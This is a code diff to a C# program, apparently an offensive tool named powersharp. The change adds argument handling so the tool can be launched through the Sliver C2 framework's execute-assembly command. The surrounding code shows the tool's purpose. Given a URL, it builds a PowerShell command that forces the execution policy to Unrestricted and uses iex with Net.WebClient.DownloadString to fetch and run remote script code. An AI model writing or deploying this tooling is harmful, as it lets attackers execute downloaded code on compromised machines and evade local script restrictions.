@@ -23,13 +23,52 @@ namespace powersharp
         }
         public static void Main(string[] args)
         {
-            if (args.Length !=2 || !args[0].Substring(0,3).Contains("/m:") || !args[1].Substring(0, 3).Contains("/c:"))
+            String module = "";
+            String command = "";
+            int param= args.Length;
+
+            if (param == 2) //Parameter verification in normal condition: parameter1 must start with "/m:", parameter2 must start with "/c:".
             {
+                String arg1= args[0].ToString();
+                String arg2 = args[1].ToString();
+                if (!arg1.Substring(0, 3).Contains("/m:") || !arg2.Substring(0, 3).Contains("/c:"))
+                {
+                    Display();
+                    return;
+                }
+                    
+            }
+            else if (param == 3) //Parameter verification in Sliver's execute-assembly: parameter1 must be "--", parameter2 must start with "/m:", parameter3 must start with "/c:".
+            {
+                String arg1 = args[0].ToString();
+                String arg2 = args[1].ToString();
+                String arg3 = args[2].ToString();
+                if (!arg1.Substring(0,2).Contains("--") || !arg2.Substring(0, 3).Contains("/m:") || !arg3.Substring(0, 3).Contains("/c:"))
+                {
+                    Display();
+                    return;
+                }
+            }
+            else
+            {
+                Console.WriteLine("Not 2 or 3 parameters");
                 Display();
                 return;
             }
-            String module = args[0].Substring(3);
-            String command = args[1].Substring(3);
+
+
+
+            if (args.Length == 3) //If it is executed in Sliver C2 execute-assembly command
+            {
+                module = args[1].Substring(3);
+                command = args[2].Substring(3);
+            }
+            else  //Otherwise
+            {
+                module = args[0].Substring(3);
+                command = args[1].Substring(3);
+            }
+
             if (module.Contains("http"))
             {
                 command = "Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force;iex(New-Object Net.Webclient).DownloadString('" + module + "')" + ";" + command;
